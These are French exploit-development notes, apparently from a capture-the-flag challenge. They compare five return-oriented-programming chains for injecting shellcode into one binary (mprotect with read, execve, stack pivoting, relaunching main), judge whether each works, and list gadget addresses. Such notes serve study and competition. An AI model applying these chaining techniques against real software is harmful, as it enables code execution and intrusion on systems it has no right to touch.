Méthode 1
=========

Injection d'un shellcode en faisant un mprotect + read + exec

hash =
0:	b2 07                	mov    dl,0x7
2:	5d                   	pop    rax
3:	c3                   	ret

ropchain =
(gadget mov eax, 10; syscall; ret);
(gadget pop rdi; ret); 0;
(gadget pop rsi; pop r15; ret); 0x601000; 0;
(gadget mov eax, 0; syscall; ret); 0x601000

step 3 = shellcode de 7 bytes

Conclusion: OK, nécessite 8 * 8 octets

Méthode 2
=========

Injection d'un shellcode en faisant un mprotect + read + exec

hash =
pop r15
pop rsi
pop rdx
ret

ropchain =
0x1000;
7;
(gadget mov eax, 10; syscall; ret);
(gadget pop rdi; ret); 0;
(gadget pop rsi, pop rdx, ret); 0x601000; 0xff;
(gadget mov eax, 0; syscall; ret); 0x601000

Conclusion: OK, nécessite 10 * 8 octets

Méthode 3
=========

Injection d'un shellcode faisant un execve

hash =
0:	b0 3b                	mov    al,0x3b
2:	5a                   	pop    rdx
3:	c3                   	ret

ropchain =
(gadget pop rdi; ret) + (0)
...

Conclusion: PAS OK, impossible de faire pointer rdi vers "/bin/bash"

Méthode 4
=========

Injection d'un shellcode en faisant un mprotect + stack pivoting

hash =
0:	b2 07                	mov    dl,0x7
2:	5d                   	pop    rax
3:	c3                   	ret

ropchain (payload) =
(gadget mov eax, 10; syscall; ret);
(gadget pop rsp; ret); 0x601900
0x400bf7 (relancement du main, avec la nouvelle stack)

Ensuite, on peut réinjecter une chaine. On prend une shellcode, de façon a ce que le hash soit
un simple pop; ret
payload = 0x601900 ; shellcode

Conclusion: PAS OK, après {pop rsp}, le {ret} échoue puisqu'il trouve 0 sur la pile

Méthode 5
=========

Injection d'un shellcode faisant mprotect + relance le main avec un grand `rdx`

hash =
58                   	pop    rax
5a                   	pop    rdx
c3                   	ret

ropchain (payload) =
7;
(gadget mov eax, 10; syscall; ret);
(gadget pop rdx, ret); 0xff
0x400bf7 (relancement du main)


Conclusion: OK, nécessite 5 * 8 octets

Gadgets
=======

0x0000000000400c8b: ret; mov eax, 1; syscall;
0x0000000000400c93: ret; mov eax, 0x3c; syscall;
0x0000000000400c9b: ret; mov eax, 0xa; syscall;
0x0000000000400ba3: hlt; pop rbx; pop rbp; pop r12; ret;
0x00000000004008b4: xor dword ptr [rcx + 1], eax; ret;
0x0000000000400ba7: pop rsp; ret;
0x00000000004008ea: pop rdi; ret;
0x00000000004008e8: pop rsi; pop r15; ret;
0x00000000004008e2: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000400b9e: add dword ptr [rax + 0x39], ecx; ret;
